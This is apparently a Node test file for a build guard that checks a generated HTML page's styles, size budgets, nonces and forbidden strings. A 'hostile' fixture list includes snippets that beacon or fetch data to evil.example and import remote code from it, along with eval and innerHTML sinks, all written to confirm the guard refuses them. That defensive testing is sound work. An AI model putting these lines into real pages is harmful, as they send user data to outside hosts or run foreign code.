import test from "node:test";
import assert from "node:assert/strict";
import { randomBytes } from "node:crypto";
import { readFileSync } from "node:fs";
import { guard, FORBIDDEN, THEME_OPENERS, JS_BUDGET, HTML_GZ_BUDGET, FONT_FILES, ENFORCE_NO_THREE } from "../guard.mjs";

const read = (n) => readFileSync(new URL(`../src/styles/${n}.css`, import.meta.url), "utf8").replace(/\r\n/g, "\n");
const STYLE = read("tokens") + read("fonts") + read("base");
const page = ({ style = STYLE, script = "console.log(1)", extra = "", title = "Panel" } = {}) =>
  `<!doctype html><html><head><title>${title}</title><script nonce="__NONCE__">var a=1</script><style nonce="__NONCE__">\n${style}\n</style></head><body>${extra}<script nonce="__NONCE__">${script}</script></body></html>`;
const problems = (p, js = "console.log(1)", o = {}) => guard(p, js, o);
const says = (list, word) => list.some((x) => x.includes(word));

test("the real tokens, fonts and base pass", () => assert.deepEqual(problems(page()), []));
test("the theme openers are the two blocks of tokens.css", () => { for (const o of THEME_OPENERS) assert.ok(STYLE.includes(o), o); });
test("every forbidden string is refused (three has its own test)", () => {
  for (const needle of FORBIDDEN) assert.ok(says(problems(page({ extra: needle }), "x"), JSON.stringify(needle)), needle);
  for (const needle of ["splitText", "url(data:", 'src="data:']) assert.ok(FORBIDDEN.includes(needle), needle);
});
test("a script or style tag without the nonce is refused", () => {
  assert.ok(problems(page({ extra: "<script>1</script>" }), "x").length > 0);
  assert.ok(problems(page({ extra: "<style>a{}</style>" }), "x").length > 0);
});
test("a title that names the job search is refused", () => assert.ok(says(problems(page({ title: "jobbot panel" }), "x"), "title")));
test("a bundle with a script tag inside is refused", () => assert.ok(says(problems(page(), "document.write('</script>')"), "script tag")));
test("three in the bundle inputs is refused by default: the guard of the real page has no way to let it in", () => {
  assert.equal(ENFORCE_NO_THREE, true);
  assert.ok(says(problems(page(), "x", { inputs: ["src/main.js", "node_modules/three/build/three.module.js"] }), '"three"'));
  assert.ok(says(problems(page(), "x", { inputs: ["node_modules\\three\\src\\Three.js"] }), '"three"'), "also with Windows separators");
  assert.deepEqual(problems(page(), "x", { inputs: ["src/main.js", "node_modules/lenis/dist/lenis.mjs"] }), []);
});
test("three in the bundle inputs is refused when it is forbidden", () => {
  const inputs = ["src/main.js", "node_modules/three/build/three.module.js"];
  assert.ok(says(problems(page(), "x", { inputs, forbidThree: true }), '"three"'));
  assert.deepEqual(problems(page(), "x", { inputs, forbidThree: false }), []);
});
test("a font-size outside the closed scale is refused; var(--fs-n) and the scale's own px pass", () => {
  assert.ok(says(problems(page({ style: STYLE + "p{font-size:14px}" })), "font-size"));
  assert.ok(says(problems(page({ style: STYLE + "p{font:600 14px Inter}" })), "font"));
  assert.deepEqual(problems(page({ style: STYLE + "p{font-size:var(--fs-4)} q{font-size:26px} r{font-size:inherit}" })), []);
});
test("__ASSETS__ is allowed only inside url(...) and the five fonts must be named", () => {
  assert.equal(says(problems(page({ style: STYLE + 'p{background:url("__ASSETS__/mark.svg")}' })), "__ASSETS__"), false);
  assert.equal(says(problems(page({ style: STYLE + "p{background:url(__ASSETS__/mark.svg)}" })), "__ASSETS__"), false, "quotes may be gone after minifying");
  assert.ok(says(problems(page({ extra: "<p>__ASSETS__/x</p>" })), "__ASSETS__"));
  assert.ok(says(problems(page({ extra: '<!-- as url("__ASSETS__/<name>") -->' })), "__ASSETS__"), "a comment that spells the placeholder is refused too");
  assert.ok(says(problems(page({ script: 'var s = "__ASSETS__/mark.svg"' }), 'var s = "__ASSETS__/mark.svg"'), "__ASSETS__"));
  for (const f of FONT_FILES) assert.ok(says(problems(page({ style: STYLE.replace(`__ASSETS__/${f}`, "__ASSETS__/other.woff2") })), f), f);
});
test("#000 and #fff in the style are refused", () => {
  assert.ok(says(problems(page({ style: STYLE + "p{color:#fff}" })), "#fff"));
  assert.ok(says(problems(page({ style: STYLE + "p{color:#000000}" })), "#000"));
});
test("a bundle over 480 KB, or an html over 200 KB gzipped (D-20, raised for the sound), is refused", () => {
  assert.equal(JS_BUDGET, 480 * 1024);
  assert.ok(says(problems(page(), "x".repeat(481 * 1024)), "budget"));
  assert.equal(HTML_GZ_BUDGET, 200 * 1024);
  assert.ok(says(problems(page({ style: STYLE + `/*${randomBytes(280 * 1024).toString("base64")}*/` })), "gzip"));
  assert.ok(!says(problems(page({ style: STYLE + `/*${randomBytes(150 * 1024).toString("base64")}*/` })), "gzip"), "a page of 150 KB of noise is within the cap");
});
test("labs only get the safety checks", () => {
  assert.deepEqual(guard("<html><link rel=x></html>", "x", { strictPage: false }), []);
  assert.ok(guard("<html>eval(1)</html>", "x", { strictPage: false }).length > 0);
});

// ---- review M5: the guard accepted 8 of 12 hostile entries (it was a list of eight strings) ----
// The twelve snippets of the review, each as the code of the page. The CSP of the real page makes every one of them inert; the guard is the
// second line there and, in the demo that is published as a file, the first, next to the meta CSP of the build (test/demo.csp.test.mjs).
const HOSTILE = [
  ["innerHTML", 'document.body.innerHTML = "<b>x</b>"', true],
  ["fetch of a foreign address", 'fetch("https://evil.example/collect?x=1")', true],
  ["sendBeacon", 'navigator.sendBeacon("https://evil.example/b", "x")', true],
  ["WebSocket", 'new WebSocket("wss://evil.example/")', true],
  ["DOMParser: it parses into an inert document and is not a sink, so it stays allowed", 'document.body.append(new DOMParser().parseFromString("<b>1</b>", "text/html").body.firstChild)', false],
  ["setHTMLUnsafe", 'document.body.setHTMLUnsafe("<b>1</b>")', true],
  ["an iframe with srcdoc", 'const f = document.createElement("iframe"); f.srcdoc = "<b>1</b>"; document.body.append(f)', true],
  ["eval", 'eval("1+1")', true],
  ["setAttribute style", 'document.body.setAttribute("style", "color:red")', true],
  ["an image that phones home", 'new Image().src = "https://evil.example/p.png"', true],
  ["setTimeout with text", 'setTimeout("alert(1)", 10)', true],
  ["a remote import()", 'import("https://evil.example/m.js")', true],
];
for (const [name, code, refused] of HOSTILE) {
  test(`M5: ${refused ? "refuses" : "accepts"} ${name}`, () => {
    const list = guard(page({ script: code }), code, { strictPage: true });
    assert.equal(list.length > 0, refused, list.join("; ") || "(nothing said)");
  });
}
test("M5: the same entries are refused in a demo build (strictPage false) and the safe look-alikes pass", () => {
  for (const [name, code, refused] of HOSTILE) assert.equal(guard(page({ script: code }), code, { strictPage: false }).length > 0, refused, name);
  for (const code of ['const get = (...a) => globalThis.fetch(...a)', 'fetch("/api/snapshot")', 'window.open(url, "_blank", "noopener,noreferrer")', 'setTimeout(() => go(), 10)', 'document.createElement("canvas")', 'document.createElementNS("http://www.w3.org/2000/svg", "svg")', 'const t = setInterval(tick, 50)', 'const lazy = Promise.resolve().then(() => 1)']) {
    assert.deepEqual(guard(page({ script: code }), code, { strictPage: true }), [], code);
  }
});
test("every url( must point at __ASSETS__/ or a #fragment, with any quoting (the rule the Rust page tests enforce)", () => {
  const withUrl = (u) => problems(page({ style: STYLE + `p{background:url(${u})}` }));
  for (const bad of ['"https://x"', "'//host/a.png'", "ruta.png", '"ruta.png"', "'ruta.png'"]) {
    assert.ok(says(withUrl(bad), "url( must point"), bad);
  }
  for (const good of ["__ASSETS__/f.woff2", '"__ASSETS__/f.woff2"', "'__ASSETS__/f.woff2'", "#grad", '"#grad"']) {
    assert.equal(says(withUrl(good), "url( must point"), false, good);
  }
});
